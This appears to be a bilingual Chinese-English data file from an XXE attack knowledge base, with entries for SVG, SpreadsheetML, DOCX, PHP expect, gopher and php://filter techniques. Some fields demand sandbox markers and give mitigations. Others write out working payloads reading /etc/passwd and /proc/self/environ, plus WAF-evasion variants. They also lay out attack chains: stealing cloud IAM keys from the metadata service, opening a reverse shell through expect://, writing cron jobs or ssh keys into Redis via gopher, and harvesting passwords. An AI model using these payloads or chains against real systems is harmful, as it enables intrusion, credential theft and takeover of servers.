prerequisites.en: Each format uses an independent valid fixture, sandbox marker, and unique job or callback token, recording a parser capability matrix, file or network audit, and derived output.

analysis.zh: 阳性要求处理该 SVG 的 worker 读取 marker 并把值放入 SVG 模型或派生产物；客户端浏览器渲染或上传成功不计。
analysis.en: A positive requires the worker processing this SVG to read the marker and place its value in the SVG model or derived artifact; client rendering or upload success does not count.

opsecTips.zh: XXE 综合矩阵每轮只测试一个格式/机制并使用 marker；禁止真实文件、元数据、gopher 和公共目标，出现扩张、外连或 worker 压力时停止。
opsecTips.en: The XXE matrix tests one format and mechanism per run with a marker; real files, metadata, gopher, and public targets are forbidden, and testing stops on expansion, egress, or worker pressure.

opsecTips.zh: 逐格式删除 fixture、marker、DTD/token 和派生产物，关闭监听器，清理各 parser/任务缓存与日志，并更新能力矩阵。
opsecTips.en: Delete per-format fixtures, markers, DTDs, tokens, and derived artifacts, close listeners, clear each parser and job cache plus logs, and update the capability matrix.

wafBypass.command: <?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY x1 SYSTEM "file:///etc/hostname"><!ENTITY x2 SYSTEM "file:///proc/version">]><svg width="100" height="100"><text x="0" y="20">&x1; &x2;</text></svg>

description.zh: 双实体分散在 text 节点，规避单实体+单路径特征组合；成功判据：渲染文本含主机名与内核版本。
description.en: Splits two entities across the text node to evade the single-entity single-path signature pair. Success: rendered text contains hostname and kernel version.

description.zh: 不用 DOCTYPE 实体，改用 image xlink:href 直接引用 file://，绕过实体声明检测；成功判据：解析器发起本地文件读取（错误/回显验证）。
description.en: Avoids DOCTYPE entities by referencing file:// directly through image xlink:href. Success: the parser reads the local file (verify via error or echo).

wafBypass.command: <?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><filter id="f"><feImage href="file:///etc/passwd"/></filter><rect width="10" height="10" filter="url(#f)"/></svg>

description.zh: 经 filter feImage 加载外部引用，规避对 image/xlink 标签的检测；成功判据：解析或渲染阶段触发文件访问。
description.en: Loads the reference through filter feImage to evade detection of image/xlink tags. Success: file access triggers during parsing or rendering.

name.zh: 通用 XML 元数据地址实体

description.zh: 隔离指向链路本地元数据地址的外部通用实体，验证通用 XML parser 的服务端 HTTP 请求边界。
description.en: Isolates an external general entity targeting a link-local metadata address to test server-side HTTP request behavior in a generic XML parser.

overview.zh: 覆盖通用 XML 解析器向云元数据地址发起请求的边界验证：外部通用实体指向链路本地元数据地址，以隔离模拟端点确认解析器会发起该请求。适用于评估 XXE 转化为元数据凭证泄露风险的场景。
overview.en: Covers boundary verification of generic XML parsers requesting the cloud metadata address: an external general entity pointing at the link-local metadata address, with an isolated simulated endpoint confirming the parser emits the request. Suitable for assessing XXE escalation into metadata credential disclosure.

vulnerability.zh: 根因是解析器允许实体指向任意 HTTP 地址，云环境中元数据地址可返回访问凭证；解析器出站不受限时，XXE 即可转化为凭证窃取。真实元数据绝不能作为验证目标。
vulnerability.en: The root cause is the parser allowing entities to point at arbitrary HTTP addresses; in cloud environments the metadata address returns access credentials, so an unrestricted parser turns XXE into credential theft. Real metadata services must never be the verification target.

exploitation.zh: 使用第 1 步命令以通用实体请求元数据地址，把地址改为隔离模拟端点并只返回短随机 XML marker；模拟端点返回的 marker 出现在解析结果中即确认解析器会发起元数据地址请求。验证全程不触碰真实元数据服务，仅证明请求行为本身。
exploitation.en: Use the step 1 command to request the metadata address via a general entity, redirecting the address to an isolated simulated endpoint returning only a short random XML marker; the simulated endpoint's marker appearing in parse results confirms the parser emits metadata-address requests. Never touch the real metadata service — this proves only the request behavior itself.

mitigation.zh: 解析器禁用外部实体，主机层对元数据服务实施访问控制（如 IMDSv2），应用出口阻断 169.254.169.254；修复后实体请求元数据地址应失败且无回显。
mitigation.en: Disable external entities in the parser, enforce access controls on the metadata service at the host layer (e.g., IMDSv2), and block 169.254.169.254 at application egress; after the fix, entity requests to the metadata address must fail with no echo.

title.en: Probe the XML endpoint and egress path

description.zh: 定位解析XML的接口并确认服务器可访问内网元数据地址段，先提交正常XML观察响应结构，接口正常返回即完成入口锁定。
description.en: Locate the XML-parsing endpoint and confirm egress toward the metadata range; a normal XML round trip completes entry reconnaissance.

description.zh: 用执行区的载荷把实体SYSTEM指向http://169.254.169.254/latest/meta-data/，响应中出现实例元数据目录内容即确认云环境信息可读。
description.en: Use the execution payload pointing the entity at the metadata service; the instance metadata directory appearing in the response confirms cloud info exposure.

description.zh: 把实体地址改为元数据服务下的iam凭据或用户数据路径，沿用第2步的载荷读取，获得临时密钥即拿到云控制面立足点。
description.en: Point the entity at IAM credential or user-data paths and rerun the step-2 payload; a temporary key grants a cloud control-plane foothold.

title.zh: 用云凭据接管实例资源
title.en: Take over instance resources with cloud keys

description.zh: 用读到的临时凭据调用云API列举存储桶与主机信息，能列出资源清单即从XXE推进到云环境横向阶段。
description.en: Call cloud APIs with the stolen credentials to enumerate buckets and hosts; a returned inventory advances from XXE into cloud lateral movement.

prerequisites.zh: 已按实际入口把基础 XML、SVG、Office XML、远程 DTD 和协议 scheme 分配给对应 parser/worker，不将整套集合一次性投递。
prerequisites.en: Basic XML, SVG, Office XML, remote DTD, and protocol schemes are mapped to their actual parser or worker entry and the full collection is never submitted at once.

prerequisites.zh: 每个格式使用独立合法 fixture、沙箱 marker 和唯一任务/回调 token，记录 parser 能力矩阵、文件/网络审计和派生输出。
prerequisites.en: Each format uses an independent valid fixture, sandbox marker, and unique job or callback token, recording a parser capability matrix, file or network audit, and derived output.

analysis.zh: 阳性要求应用 parser 向模拟端点发送当前 token，若声称内容可读还必须让 marker 进入解析输出；URL、DNS 或连接错误不足。
analysis.en: A positive requires the application parser to send the current token to the simulator, and a readable-content claim additionally requires the marker in parsed output; a URL, DNS, or connection error is insufficient.

opsecTips.zh: XXE 综合矩阵每轮只测试一个格式/机制并使用 marker；禁止真实文件、元数据、gopher 和公共目标，出现扩张、外连或 worker 压力时停止。
opsecTips.en: The XXE matrix tests one format and mechanism per run with a marker; real files, metadata, gopher, and public targets are forbidden, and testing stops on expansion, egress, or worker pressure.

opsecTips.zh: 逐格式删除 fixture、marker、DTD/token 和派生产物，关闭监听器，清理各 parser/任务缓存与日志，并更新能力矩阵。
opsecTips.en: Delete per-format fixtures, markers, DTDs, tokens, and derived artifacts, close listeners, clear each parser and job cache plus logs, and update the capability matrix.

description.zh: 元数据路径大写绕过对 /latest/meta-data/ 小写特征的拦截（AWS 服务端大小写不敏感）；成功判据：仍返回元数据列表。
description.en: Upper-cases the path since the AWS metadata endpoint is case-insensitive, evading lowercase /latest/meta-data/ signatures. Success: metadata listing still returns.

description.zh: 直达角色凭据路径，规避仅匹配根路径的规则；成功判据：返回角色名列表。
description.en: Jumps straight to the credentials path to evade rules matching only the root. Success: a role name list is returned.

title.zh: 数字实体编码 IP 变体

description.zh: 链路本地地址以数字字符实体编码，规避 169.254 明文黑名单；成功判据：解析后仍请求元数据服务。
description.en: Encodes the link-local address as numeric entities to evade the 169.254 plaintext blacklist. Success: the metadata service is still requested after parsing.

name.zh: SpreadsheetML 形态本地文件实体

description.zh: 隔离根元素为 sst 的无命名空间 XML 样例，验证实际接收该形态输入的 parser，而不把它误称为完整 XLSX 部件。
description.en: Isolates the namespace-free sst-root XML sample to test the parser that actually accepts this shape without mislabeling it as a complete XLSX part.

overview.zh: 覆盖 SpreadsheetML 形态（根元素 sst）XML 入口的本地文件实体验证：以无命名空间 sst 样例承载文件实体，确认实际接收该形态输入的解析器。适用于区分完整 XLSX 部件与裸 SpreadsheetML 入口的场景。
overview.en: Covers local file-entity verification at SpreadsheetML-shaped (root element sst) XML entries: a namespace-free sst sample carrying a file entity identifies the parser actually receiving this input shape. Suitable for separating full XLSX parts from bare SpreadsheetML entries.

vulnerability.zh: 根因是接收 sst 形态裸 XML 的解析器同样允许外部实体展开，该入口与完整 XLSX 部件解析是不同代码路径；形态判定错误会把风险归因到错误组件。
vulnerability.en: The root cause is parsers receiving bare sst-shaped XML also allowing external entity expansion — a distinct code path from full XLSX part parsing; misjudging the shape attributes the risk to the wrong component.

exploitation.zh: 使用第 1 步命令以 SpreadsheetML 形态承载本地文件实体，在已确认接收原始 XML 的入口提交，把系统路径改为随机 marker；解析结果出现 marker 内容即确认该 XML 入口可读本地文件。该行仅证明裸 sst 形态入口，不得当作完整 XLSX 测试，两者分别归因。
exploitation.en: Use the step 1 command to carry a local file entity in SpreadsheetML shape, submitting at an entry confirmed to receive raw XML with the system path replaced by a random marker; marker content in parse results confirms this XML entry reads local files. This line proves only the bare sst-shaped entry and must not be treated as a full XLSX test — attribute the two separately.

mitigation.zh: 裸 XML 入口与 OOXML 解析栈统一禁用 DTD 与外部实体，按入口维护回归矩阵并明确各入口接收的形态；修复后重放实体样例应报禁止错误。
mitigation.en: Disable DTDs and external entities uniformly across bare-XML entries and the OOXML parsing stack, maintain an entry-level regression matrix, and document which shape each entry accepts; after the fix, replaying entity samples must raise forbidden errors.

description.zh: 寻找接受XML或表格导入的接口，先提交一份合法的共享字符串表结构确认解析，导入任务正常完成即锁定承载实体的入口。
description.en: Find an XML or spreadsheet import endpoint and submit a valid shared-strings structure; a clean import run locks in the entity carrier.

title.en: Inject an entity via shared strings

description.zh: 用执行区的SpreadsheetML载荷，在sst的si/t节点中引用外部实体并提交导入，单元格或解析日志出现文件内容即确认读取原语。
description.en: Use the execution payload referencing the entity from the si/t node and submit the import; file contents surfacing in cells or logs confirm the read primitive.

description.zh: 把实体路径改为业务数据库文件、应用配置所在位置，继续用第2步的载荷读取，提取到账号口令即完成数据面收割。
description.en: Point the entity at business database files and app configs, rerun the step-2 payload; extracted accounts and passwords complete the data haul.

prerequisites.zh: 已按实际入口把基础 XML、SVG、Office XML、远程 DTD 和协议 scheme 分配给对应 parser/worker，不将整套集合一次性投递。
prerequisites.en: Basic XML, SVG, Office XML, remote DTD, and protocol schemes are mapped to their actual parser or worker entry and the full collection is never submitted at once.

prerequisites.zh: 每个格式使用独立合法 fixture、沙箱 marker 和唯一任务/回调 token，记录 parser 能力矩阵、文件/网络审计和派生输出。
prerequisites.en: Each format uses an independent valid fixture, sandbox marker, and unique job or callback token, recording a parser capability matrix, file or network audit, and derived output.

analysis.zh: 阳性要求实际 parser 读取 marker 并把值写入 sst/si/t 模型或提取输出；仅元素名像 SpreadsheetML 或解析错误不计。
analysis.en: A positive requires the actual parser to read the marker and place its value in the sst/si/t model or extracted output; SpreadsheetML-like names or parse errors do not count.

opsecTips.zh: XXE 综合矩阵每轮只测试一个格式/机制并使用 marker；禁止真实文件、元数据、gopher 和公共目标，出现扩张、外连或 worker 压力时停止。
opsecTips.en: The XXE matrix tests one format and mechanism per run with a marker; real files, metadata, gopher, and public targets are forbidden, and testing stops on expansion, egress, or worker pressure.

opsecTips.zh: 逐格式删除 fixture、marker、DTD/token 和派生产物，关闭监听器，清理各 parser/任务缓存与日志，并更新能力矩阵。
opsecTips.en: Delete per-format fixtures, markers, DTDs, tokens, and derived artifacts, close listeners, clear each parser and job cache plus logs, and update the capability matrix.

wafBypass.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE sst [<!ENTITY c SYSTEM "file:///etc/passwd"><!ENTITY h SYSTEM "file:///etc/hostname">]><sst><si><t>&c;</t></si><si><t>&h;</t></si></sst>

description.zh: 把实体分散到多个共享字符串槽位，规避单点实体+单路径检测；成功判据：导入后单元格内容含文件数据。
description.en: Spreads entities across shared-string slots to evade single-entity single-path detection. Success: imported cells contain file data.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE x [<!ENTITY d SYSTEM "file:///proc/self/environ">]><worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>&d;</t></is></c></row></sheetData></worksheet>

description.zh: 在 worksheet 行内联字符串注入实体，绕过仅检查 sharedStrings.xml 的解析路径；成功判据：A1 单元格出现环境变量。
description.en: Injects the entity into worksheet inline strings, bypassing parsers that only inspect sharedStrings.xml. Success: cell A1 shows environment variables.

wafBypass.command: 将 xl/sharedStrings.xml 重写为 UTF-16 编码（<?xml version="1.0" encoding="UTF-16"?>，实体字节整体双宽）<!DOCTYPE sst [<!ENTITY x SYSTEM "file:///etc/passwd">]><sst><si><t>&x;</t></si></sst>

description.zh: OOXML 部件声明 UTF-16 后内容特征不可见，绕过上传侧 ASCII 扫描；成功判据：电子表格解析器仍展开实体。
description.en: Declaring the OOXML part as UTF-16 hides content signatures from upload scanners. Success: the spreadsheet parser still expands the entity.

name.zh: 通用 XML PHP Expect 实体边界

description.zh: 隔离 expect:// 外部实体，验证 PHP/libxml 通用 XML 入口是否暴露 expect 扩展。
description.en: Isolates an expect:// external entity to test whether a generic PHP/libxml XML entry exposes the expect extension.

overview.zh: 覆盖通用 XML 入口对 PHP expect:// 包装器的暴露验证：以 expect:// 外部实体声明探测 wrapper 是否被解析，返回任务 marker 即确认暴露。适用于 PHP/libxml 技术栈的 XXE 升级条件评估。
overview.en: Covers exposure verification of the PHP expect:// wrapper at generic XML entries: declaring an expect:// external entity to probe whether the wrapper is resolved, with a returned task marker confirming exposure. Suitable for assessing XXE escalation preconditions in PHP/libxml stacks.

vulnerability.zh: 根因是 PHP expect 扩展启用时 expect:// wrapper 对 XML 解析器可用，实体内容会被当作命令执行；该能力与通用文件实体读取是独立的升级路径，需单独确认。
vulnerability.en: The root cause is the expect:// wrapper being available to the XML parser when the PHP expect extension is enabled, so entity content executes as a command; this capability is an escalation path independent of generic file-entity reads and needs separate confirmation.

exploitation.zh: 使用第 1 步命令以 expect:// 包装器声明实体；wrapper 返回当前任务 marker 即确认 expect 包装器被解析。验证只用无子进程的测试 wrapper 返回 marker，绝不运行原始 id 命令；先确认 PHP expect 扩展状态作为前提记录，确认暴露后再单独评估真实命令执行影响与升级路径。
exploitation.en: Use the step 1 command to declare an entity via the expect:// wrapper; the wrapper returning the current task marker confirms the expect wrapper is resolved. Verify only with a subprocess-free test wrapper returning a marker — never run the raw id command; record the PHP expect extension state as a precondition first, then assess real command-execution impact and escalation separately once exposure is confirmed.

mitigation.zh: 生产 PHP 禁用 expect 扩展，解析器禁用外部实体与自定义 wrapper；修复后 expect 实体应报未知 wrapper 且无 marker 返回，并在部署基线中固化该配置。
mitigation.en: Disable the expect extension in production PHP and forbid external entities and custom wrappers in the parser; after the fix, expect entities must report an unknown wrapper with no marker returned, and the baseline must lock in this configuration.

description.zh: 通过报错信息、响应头或已知接口特征判断后端是否为PHP且加载expect扩展，确认解析XML的入口正常工作即完成环境指纹。
description.en: Use error messages and headers to confirm a PHP backend with the expect wrapper loaded; a working XML entry completes the fingerprint.

title.zh: 声明expect实体探测命令执行
title.en: Declare an expect entity to probe execution

description.zh: 用执行区的载荷声明指向expect://id的实体并在文档中引用，响应中出现uid与gid输出即确认expect包装器可执行命令。
description.en: Use the execution payload declaring the expect://id entity and reference it; uid and gid output in the response confirms command execution.

title.en: Escalate commands to gain a foothold

description.zh: 把expect命令换为whoami、hostname与反弹shell语句，沿用第2步的实体声明方式提交，拿到交互会话即完成远程控制。
description.en: Swap the expect command for whoami and a reverse shell, resubmitting as in step 2; an interactive session completes remote control.

prerequisites.zh: 已按实际入口把基础 XML、SVG、Office XML、远程 DTD 和协议 scheme 分配给对应 parser/worker，不将整套集合一次性投递。
prerequisites.en: Basic XML, SVG, Office XML, remote DTD, and protocol schemes are mapped to their actual parser or worker entry and the full collection is never submitted at once.

prerequisites.zh: 每个格式使用独立合法 fixture、沙箱 marker 和唯一任务/回调 token，记录 parser 能力矩阵、文件/网络审计和派生输出。
prerequisites.en: Each format uses an independent valid fixture, sandbox marker, and unique job or callback token, recording a parser capability matrix, file or network audit, and derived output.

analysis.zh: 阳性要求无副作用测试 wrapper 在目标 PHP parser 进程内被调用；命令文本、scheme 识别或解析错误不能证明执行。
analysis.en: A positive requires the side-effect-free test wrapper to be invoked inside the target PHP parser process; command text, scheme recognition, or parse errors do not prove execution.

opsecTips.zh: XXE 综合矩阵每轮只测试一个格式/机制并使用 marker；禁止真实文件、元数据、gopher 和公共目标，出现扩张、外连或 worker 压力时停止。
opsecTips.en: The XXE matrix tests one format and mechanism per run with a marker; real files, metadata, gopher, and public targets are forbidden, and testing stops on expansion, egress, or worker pressure.

opsecTips.zh: 逐格式删除 fixture、marker、DTD/token 和派生产物，关闭监听器，清理各 parser/任务缓存与日志，并更新能力矩阵。
opsecTips.en: Delete per-format fixtures, markers, DTDs, tokens, and derived artifacts, close listeners, clear each parser and job cache plus logs, and update the capability matrix.

description.zh: 命令 base64 化执行，规避 expect://id 明文特征；成功判据：返回 uid 输出。
description.en: Base64-encodes the command to evade the plaintext expect://id signature. Success: uid output returned.

description.zh: $IFS 代替空格，规避对 expect://cat /flag 空格特征的匹配；成功判据：flag 内容回显。
description.en: Uses $IFS for whitespace to evade matching of expect://cat /flag with spaces. Success: flag contents echoed.

description.zh: expect 调用经参数实体中转并引号拆分命令，双重规避直连特征；成功判据：用户名回显。
description.en: Routes the expect call through a parameter entity with quote-split command for double evasion. Success: username echoed.

name.zh: DOCX 外部通用实体资源解析

description.zh: 归并 file 与 HTTP SYSTEM 标识符变体，验证 word/document.xml 中外部通用实体是否由服务端展开。
description.en: Groups file and HTTP SYSTEM-identifier variants to test server-side expansion of external general entities in word/document.xml.

overview.zh: 覆盖 DOCX 文档解析入口的外部通用实体验证：在 word/document.xml 中注入文件、proc、元数据与 Windows 路径实体样例，经解析日志或文档内容确认可达性。适用于服务端预览、转换或索引 Word 文档的场景。
overview.en: Covers external general entity verification at the DOCX parsing entry: injecting file, proc, metadata, and Windows-path entity samples into word/document.xml, confirming reachability via parse logs or document content. Suitable when servers preview, convert, or index Word documents.

vulnerability.zh: 根因是文档处理链允许内部 DTD 并让 XML 解析器展开 file、HTTP 等外部实体；上传网关先接受文件、异步转换服务后触发解析，证据必须绑定到具体后台组件与任务，上传成功不代表漏洞。
vulnerability.en: The root cause is the document chain allowing internal DTDs with XML parsers expanding file, HTTP, and other external entities; the upload gateway accepts first and async conversion services parse later, so evidence must bind to specific backend components and tasks — upload success is not the vulnerability.

exploitation.zh: 使用第 1 步命令以 DOCX document.xml 形态逐行注入文件、proc、元数据与 Windows 路径实体样例；解析日志或文档内容出现 marker 即确认对应目标可达。执行前把原目标改写为沙箱 marker 文件或隔离 HTTP 端点，仅修改 word/document.xml 并保留合法 ZIP 结构，上传后触发预览或转换并记录任务 ID 与转换日志。
exploitation.en: Use the step 1 command to inject file, proc, metadata, and Windows-path entity samples into DOCX document.xml line by line; markers in parse logs or document content confirm each target is reachable. Rewrite original targets as sandbox marker files or isolated HTTP endpoints beforehand, modify only word/document.xml keeping valid ZIP structure, then trigger preview or conversion after upload, logging task IDs and conversion logs.

mitigation.zh: 在所有 Office 文档解析器禁用 DOCTYPE、外部通用实体与参数实体，转换服务置于无网络只读低权限沙箱；解包前后校验文件类型与部件清单，监控文档任务外连并维护恶意 DOCX 回归样例。
mitigation.en: Disable DOCTYPE, external general entities, and parameter entities across all Office document parsers, running conversion services in network-free read-only low-privilege sandboxes; validate file types and part inventories before and after unpacking, monitor document-task egress, and maintain malicious DOCX regression samples.

description.zh: 寻找上传并解析DOCX的功能，如预览、全文检索或转换服务，提交一份正常文档任务成功完成，即锁定可注入的解析入口。
description.en: Find DOCX preview, search, or conversion features; a normal document processing cleanly locks in the injection-capable parser entry.

title.en: Repack the DOCX with an injected entity

description.zh: 解开DOCX后把执行区载荷写入document.xml的实体声明再打包上传，解析结果或服务日志出现目标文件内容即确认实体生效。
description.en: Unzip the DOCX, write the execution payload's entity declaration into document.xml, repack and upload; target file contents in results confirm the entity fired.

description.zh: 将实体SYSTEM值依次换成passwd、应用配置与密钥文件路径，沿用第2步的重打包流程上传，收集到敏感内容即完成信息收割。
description.en: Iterate the entity target across passwd, app configs, and key files using the step-2 repack flow; harvested secrets complete the sweep.

prerequisites.zh: 服务端确实解包 DOCX 并用 XML parser 读取 word/document.xml，解析库、DTD/实体配置和异步处理 worker 已确认。
prerequisites.en: The server actually unpacks DOCX and parses word/document.xml with an XML parser, with parser library, DTD and entity settings, and asynchronous worker confirmed.

prerequisites.zh: 使用结构合法的最小 DOCX，只把实体目标改为工作目录内固定 marker 文件；保留 ZIP 成员哈希、任务 ID、文件审计和预览输出。
prerequisites.en: A structurally valid minimal DOCX points its entity only to a fixed marker file in the worker directory, preserving ZIP-member hashes, job identifier, file audit, and preview output.

analysis.zh: 阳性要求 DOCX worker 的 marker 文件读取或 token 化 HTTP 首包与同一任务及展开输出关联；仅 URI、错误或 DNS 不是实体展开。
analysis.en: A positive correlates a DOCX-worker marker-file read or tokenized HTTP first packet with the same job and expanded output; a URI, error, or DNS alone is not entity expansion.

opsecTips.zh: DOCX XXE 只读取专用 marker，禁止 /etc、proc、凭据或网络实体；出现真实文件访问、外连、解压膨胀、任务堆积或 worker 崩溃时停止。
opsecTips.en: DOCX XXE reads a dedicated marker only and forbids system, proc, credential, or network entities; stop on real-file access, egress, decompression expansion, job backlog, or worker crash.

opsecTips.zh: 删除测试 DOCX、解包目录、预览产物和 marker，清空文档队列/对象存储/转换缓存，并重启隔离处理 worker。
opsecTips.en: Delete test DOCX files, extraction directories, previews, and markers, clear document queues, object storage, and conversion caches, and restart isolated processing workers.

wafBypass.command:
word/settings.xml:
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:updateFields w:val="true"/></w:settings>

description.zh: 把实体注入 word/settings.xml 等次级部件，绕过仅扫描 document.xml 的过滤；成功判据：打开文档时触发实体解析。
description.en: Injects the entity into word/settings.xml to bypass filters scanning only document.xml. Success: entity resolution triggers when the document opens.

description.zh: 利用元数据部件的实体解析，规避对主文档部件的检测；成功判据：属性解析时文件内容进入文档模型。
description.en: Abuses metadata part parsing to evade detection aimed at main document parts. Success: file contents enter the document model during property parsing.

description.zh: 实体引用藏进深层 run/text 节点，规避对 &xxe; 顶层引用的特征；成功判据：渲染文档时正文含文件内容。
description.en: Nests the entity reference inside deep run/text nodes to evade top-level &xxe; signatures. Success: rendered document body shows file contents.

name.zh: DOCX Gopher 实体请求边界

description.zh: 隔离 DOCX 外部实体中的 gopher URI，验证解析器是否把非 HTTP scheme 交给网络 resolver。
description.en: Isolates the gopher URI in a DOCX external entity to test whether the parser delegates a non-HTTP scheme to a network resolver.

overview.zh: 覆盖 DOCX 解析器对非 HTTP scheme 的委托验证：以 word/document.xml 实体承载 gopher:// 请求，自有 resolver 收到请求即确认 gopher wrapper 被解析。用于评估文档转换服务的出站协议边界。
overview.en: Covers delegation verification for non-HTTP schemes in DOCX parsers: word/document.xml entities carrying gopher:// requests, with your resolver receiving the request confirming the gopher wrapper was resolved. Used to assess the document conversion service's outbound protocol boundary.

vulnerability.zh: 根因是 DOCX XML resolver 接受 gopher 等协议并可发起任意构造的出站流量；验证仅证明 wrapper 被解析，不发送真实协议副作用数据，Redis 等利用需单独评估。
vulnerability.en: The root cause is the DOCX XML resolver accepting protocols like gopher and emitting arbitrarily crafted outbound traffic; verification proves only wrapper resolution and sends no real protocol side-effect data — Redis-style exploitation needs separate assessment.

exploitation.zh: 使用第 1 步命令以 DOCX 实体承载 gopher:// 请求；自有 resolver 收到该请求即确认 gopher wrapper 被解析。不要发送原始 Redis INFO 序列，把 URI 替换为无协议副作用的单次 resolver marker，上传后主动触发预览或转换任务并按任务 ID 关联解析日志。wrapper 解析失败时记录报错形态作为阴性依据留档。
exploitation.en: Use the step 1 command to carry a gopher:// request in a DOCX entity; your resolver receiving it confirms the gopher wrapper was resolved. Never send raw Redis INFO sequences — replace the URI with a single side-effect-free resolver marker, trigger preview or conversion after upload, and correlate parse logs by task ID. Record the error shape as archived negative evidence when wrapper resolution fails.

mitigation.zh: 文档解析器禁用外部实体并把出站协议限制为白名单，明确拒绝 gopher 等非业务 scheme；转换容器无网络运行，对协议委托与外连事件建立监控。
mitigation.en: Disable external entities in document parsers and allowlist outbound protocols, explicitly rejecting non-business schemes like gopher; run conversion containers without networking and monitor protocol delegation and egress events.

description.zh: 在自己控制的服务器上起接收服务并记录请求，寻找解析DOCX的接口，正常文档任务成功即锁定承载gopher请求的入口。
description.en: Stand up a receiver logging requests, find the DOCX-parsing endpoint; a clean document run locks in the gopher carrier.

title.en: Inject a gopher entity to hit internal ports

description.zh: 用执行区载荷把实体指向gopher://127.0.0.1:6379，解析触发后接收端看到请求即确认gopher包装器可发任意协议报文。
description.en: Use the execution payload pointing the entity at gopher://127.0.0.1:6379; the receiver seeing the request confirms arbitrary protocol packets are possible.

description.zh: 把gopher负载换成向内网Redis写计划任务或sshkey的指令序列，继续用第2步的实体触发，主机出现新增任务或密钥即拿下shell。
description.en: Rebuild the gopher payload as Redis directives writing cron or ssh keys and retrigger as in step 2; a new task or key on the host means shell.

prerequisites.zh: 服务端确实解包 DOCX 并用 XML parser 读取 word/document.xml，解析库、DTD/实体配置和异步处理 worker 已确认。
prerequisites.en: The server actually unpacks DOCX and parses word/document.xml with an XML parser, with parser library, DTD and entity settings, and asynchronous worker confirmed.

prerequisites.zh: 使用结构合法的最小 DOCX，只把实体目标改为工作目录内固定 marker 文件；保留 ZIP 成员哈希、任务 ID、文件审计和预览输出。
prerequisites.en: A structurally valid minimal DOCX points its entity only to a fixed marker file in the worker directory, preserving ZIP-member hashes, job identifier, file audit, and preview output.

analysis.zh: 阳性只是在受控 resolver 收到来自 DOCX worker 的当前任务 token；编码字符串、DNS 或连接失败均不足以证明协议请求。
analysis.en: A positive is limited to the controlled resolver receiving the current job token from the DOCX worker; encoded text, DNS, or a failed connection does not prove a protocol request.

opsecTips.zh: DOCX XXE 只读取专用 marker，禁止 /etc、proc、凭据或网络实体；出现真实文件访问、外连、解压膨胀、任务堆积或 worker 崩溃时停止。
opsecTips.en: DOCX XXE reads a dedicated marker only and forbids system, proc, credential, or network entities; stop on real-file access, egress, decompression expansion, job backlog, or worker crash.

opsecTips.zh: 删除测试 DOCX、解包目录、预览产物和 marker，清空文档队列/对象存储/转换缓存，并重启隔离处理 worker。
opsecTips.en: Delete test DOCX files, extraction directories, previews, and markers, clear document queues, object storage, and conversion caches, and restart isolated processing workers.

description.zh: gopher 被禁时改用 ftp:// 协议交互；成功判据：目标端口收到 FTP 指令序列。
description.en: Falls back to the ftp:// scheme when gopher is blocked. Success: the target port receives FTP command sequences.

description.zh: CRLF 换成 %0D%0A 编码并用 & 分隔参数，规避明文换行与 INFO 命令特征；成功判据：Redis 执行注入指令。
description.en: Encodes CRLF as %0D%0A and separates arguments with & to evade plaintext newlines and INFO command signatures. Success: Redis executes the injected commands.

description.zh: gopher 实体放入 docProps/app.xml 次级部件，绕过 document.xml 扫描；成功判据：内网服务收到请求。
description.en: Places the gopher entity in docProps/app.xml to bypass document.xml scanning. Success: the internal service receives the request.

name.zh: DOCX PHP Filter 实体读取边界

description.zh: 隔离 php://filter 外部实体，验证基于 PHP/libxml 的 DOCX 处理链是否启用 stream wrapper。
description.en: Isolates php://filter external entities to test whether a PHP/libxml DOCX pipeline enables stream wrappers.

overview.zh: 覆盖 PHP/libxml 文档处理链的 stream wrapper 暴露验证：以 DOCX 实体承载 php://filter 读取，Base64 结果解码为 marker 即确认 filter 读取链可用。适用于 PHP 技术栈的 Word 文档处理服务。
overview.en: Covers stream-wrapper exposure verification in PHP/libxml document chains: DOCX entities carrying php://filter reads, with the Base64 result decoding to a marker confirming the filter read chain. Suitable for PHP-stack Word document processing services.

vulnerability.zh: 根因是 PHP/libxml 文档处理链允许 stream wrapper 并继承文件读取权限，上传层只校验扩展名或 MIME；filter 读取可编码获取任意文件内容，需在隔离夹具中以随机 marker 验证。
vulnerability.en: The root cause is PHP/libxml document chains allowing stream wrappers that inherit file-read privileges while the upload layer checks only extension or MIME; filter reads obtain arbitrary file content in encoded form, verified with random markers inside isolated fixtures.

exploitation.zh: 使用第 1 步命令以 DOCX 实体承载 php://filter 读取；Base64 结果解码为 marker 内容即确认 filter 读取链可用。不得读取源路径，在 PHP 隔离夹具中把 resource 改为只含随机值的 marker 文件，上传后触发预览或文本提取并记录解析日志。解码结果与预置 marker 完全一致才计为阳性。
exploitation.en: Use the step 1 command to carry php://filter reads in a DOCX entity; the Base64 result decoding to marker content confirms the filter read chain. Never read source paths — point resource at a marker file holding only random values inside an isolated PHP fixture, then trigger preview or text extraction after upload and record parse logs. Count as positive only when the decoded result matches the preset marker exactly.

mitigation.zh: 文档处理链禁用外部实体与 stream wrapper，PHP 环境按需关闭非业务协议包装器；转换服务以最小文件视图运行，对 filter 类实体访问建立审计与回归。
mitigation.en: Disable external entities and stream wrappers in document chains, closing non-business protocol wrappers in PHP as needed; run conversion services with a minimal file view, auditing and regression-testing filter-class entity access.

description.zh: 通过错误响应与接口指纹判断DOCX由PHP解析且禁用直接回显，正常上传任务成功即锁定注入入口，准备filter链读取。
description.en: Confirm via errors and fingerprinting that PHP parses the DOCX with direct echo disabled; a clean upload readies the filter-chain read.

title.en: Inject a filter entity to read source

description.zh: 用执行区载荷声明php://filter实体的base64编码读取，把目标指向业务入口文件，响应出现Base64串解码后为PHP源码即成功。
description.en: Use the execution payload declaring the php://filter entity and aim it at the app entry file; a Base64 blob decoding to PHP source confirms success.

title.zh: 审计源码寻找更多漏洞
title.en: Audit the source for more flaws

description.zh: 解码得到的源码中查找硬编码口令、调试接口与二次注入点，任一可利用点被复验成功即把文件读取升级为代码执行路径。
description.en: Mine the decoded source for hardcoded secrets, debug routes, and second-order injection; any confirmed flaw upgrades file read toward code execution.

prerequisites.zh: 服务端确实解包 DOCX 并用 XML parser 读取 word/document.xml，解析库、DTD/实体配置和异步处理 worker 已确认。
